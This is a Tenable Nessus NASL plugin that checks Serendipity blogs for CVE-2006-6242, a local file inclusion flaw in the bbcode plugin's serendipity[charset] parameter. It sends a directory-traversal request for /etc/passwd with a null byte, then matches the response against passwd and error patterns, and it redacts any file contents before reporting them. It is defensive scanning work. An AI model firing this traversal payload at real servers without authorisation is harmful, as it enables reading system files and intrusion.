#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(23752);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-6242");
  script_bugtraq_id(21367);
  script_xref(name:"EDB-ID", value:"2869");

  script_name(english:"Serendipity serendipity_event_bbcode.php Script serendipity[charset] Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
a local file inclusion issue.");
  script_set_attribute(attribute:"description", value:
"The 'plugins/serendipity_event_bbcode/serendipity_event_bbcode.php'
script included with the version of Serendipity installed on the
remote host fails to sanitize input to the 'serendipity[charset]'
parameter before using it to include PHP code. 

Provided PHP's 'register_globals' setting is enabled, an
unauthenticated, remote attacker may be able to exploit this issue to
view arbitrary files or to execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user id. 

Note that several other scripts included in Serendipity are reportedly
affected by the same issue, although Nessus has not checked them.");
  script_set_attribute(attribute:"see_also", value:"https://board.s9y.org/viewtopic.php?f=6&t=7926");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Serendipity version 1.0.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/11/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/12/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/12/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:s9y:serendipity");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("serendipity_detect.nasl");
  script_require_keys("www/serendipity");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  file = "../../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/plugins/serendipity_event_bbcode/serendipity_event_bbcode.php?",
      "serendipity[charset]=", file ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    egrep(pattern:"main\(.+/etc/passwd\\0lang/.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.+/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");
    else contents = "";

    if (contents)
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
